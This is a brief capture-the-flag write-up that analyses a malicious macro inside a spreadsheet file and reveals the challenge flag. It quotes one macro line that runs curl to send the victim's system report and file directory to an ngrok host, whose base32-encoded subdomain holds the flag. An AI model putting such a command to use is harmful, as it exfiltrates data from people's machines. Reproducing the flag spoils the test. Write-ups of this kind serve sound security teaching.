## Logistics

#### Challenge Difficulty: Medium
#### Topic: macro, xlsx
#### Author: d151nt3gr4t0r

The challenge provides us with an ods file. This file is an excel file which contains one macro with a malicious sample. It's possible to extract the macro from the excel file, safely using uletools.

Analyzing the macro, eventually you will stumble across this code:
`GDHJFDKGD.Run("curl http://mnzwg63ngrrxembvl42hem27oazxezrtmn2gy6k7myyw4m35.ngrok.io/?os=" + SysReport + "&rev=5.4" + "&ret=" + MY_FILEDIR, 1 ,true)`


In order to decode this value, you need to first uppercase all the sequence and then base32 decode it.

Flag: csc{m4cr05_4r3_p3rf3ctly_f1n3}